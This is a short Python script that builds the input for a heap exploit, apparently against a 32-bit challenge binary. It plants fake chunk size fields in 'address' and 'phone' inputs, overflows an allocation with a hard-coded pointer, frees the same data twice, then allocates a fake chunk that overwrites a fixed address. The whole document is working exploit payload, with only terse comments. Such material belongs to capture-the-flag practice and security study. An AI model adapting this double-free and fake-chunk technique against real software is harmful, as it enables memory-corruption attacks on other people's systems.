
data = ""

# address
data += "\x00"*4 + "\x31\x00\x00\x00" + "\n"
# phone
data += "\x00"*244 + "\x31\x00\x00\x00" + "\n"

# malloc test data
data += "1" + "\n"
data += "a"*32 + "\xb8\xb1\x04\x08" + "\n"
data += "31337" + "\n"

# free data
data += "2" + "\n"

# free data
data += "2" + "\n"

# malloc fake chunk
data += "1" + "\n"
data += "bbbb" + "\x38\xb0\x04\x08" + "\n"
data += str(0x61616161) + "\n"

